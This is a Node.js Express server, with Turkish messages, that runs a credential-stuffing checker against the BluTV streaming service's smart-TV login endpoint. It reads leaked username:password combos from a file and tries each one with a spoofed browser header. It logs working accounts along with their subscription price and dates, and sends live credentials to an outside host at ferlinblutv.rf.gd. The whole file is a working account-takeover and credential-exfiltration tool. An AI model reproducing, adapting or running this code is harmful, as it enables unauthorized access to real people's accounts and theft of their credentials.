const express = require('express');
const axios = require('axios');
const fs = require('fs');
const moment = require('moment-timezone');
const app = express();

let isScanning = false;  

app.get('/', async (req, res) => {
    const comboFilePath = 'combo.txt';

    isScanning = true;

    try {
        const comboLines = fs.readFileSync(comboFilePath, 'utf-8').split('\n');
        const turkeyTimeNow = moment().tz("Europe/Istanbul").format("YYYY-MM-DD");

        for (let line of comboLines) {
            if (line.includes(':')) {
                const [username, password] = line.trim().split(':');

                const url = 'https://smarttv.blutv.com.tr/actions/account/login';
                const headers = {
                    'accept': 'application/json, text/javascript, */*; q=0.01',
                    'accept-encoding': 'gzip, deflate, br',
                    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'user-agent': 'Mozilla/5.0 (Windows; Windows NT 6.1; x64; en-US) Gecko/20100101 Firefox/61.5'
                };
                const data = new URLSearchParams({
                    'username': username,
                    'password': password,
                    'platform': 'com.blu.smarttv'
                });

                try {
                    const response = await axios.post(url, data.toString(), { headers });

                    if (response.status === 200 && response.data && response.data.status === "ok") {
                        const userData = response.data.user;
                        const startDateRaw = userData ? userData.StartDate : null;
                        const endDateRaw = userData ? userData.EndDate : null;
                        const price = userData ? userData.Price : 'Bilinmiyor';

                        if (!endDateRaw || moment(endDateRaw).isBefore(turkeyTimeNow)) {
                            console.log(`!Custom Hesap! - ${username}:${password}`);
                        } else {
                            const startDate = startDateRaw ? moment(startDateRaw).format('YYYY-MM-DD') : 'Bilinmiyor';
                            const endDate = endDateRaw ? moment(endDateRaw).format('YYYY-MM-DD') : 'Bilinmiyor';

                            console.log(`!Hit Hesap! - ${username}:${password}`);
                            console.log(`Fiyat: ${price}`);
                            console.log(`Başlangıç Tarihi: ${startDate}`);
                            console.log(`Bitiş Tarihi: ${endDate}`);

                            const apiUrl = `http://ferlinblutv.rf.gd/api.php?ekle=Kullanıcı Adı: ${username}/nŞifre: ${password}/nFiyat: ${price} /nBaşlangıç Tarihi: ${startDate}/nBitiş Tarihi: ${endDate}&i=1`;
                            await axios.get(apiUrl, { headers });
                        }
                    } else {
                        console.log(`Yanlış Hesap: ${username}:${password}`);
                    }
                } catch (error) {
                    console.error(`Hata oluştu: ${error.message}`);
                }
            }
        }

        isScanning = false;
        res.json({ status: "success", message: "Tarama tamamlandı." });
    } catch (err) {
        isScanning = false;
        console.error("Dosya okunurken hata oluştu:", err);
        res.json({ status: "error", message: "Tarama sırasında hata oluştu." });
    }
});

app.get('/status', (req, res) => {
    if (isScanning) {
        res.json({ status: "success", message: "Tarama devam ediyor..." });
    } else {
        res.json({ status: "false", message: "Tarama durdu." });
    }
});

app.use(express.static('public'));

if (require.main === module) {
    app.listen(8080, () => {
        console.log('Server 8080 portunda çalışıyor.');
    });
}
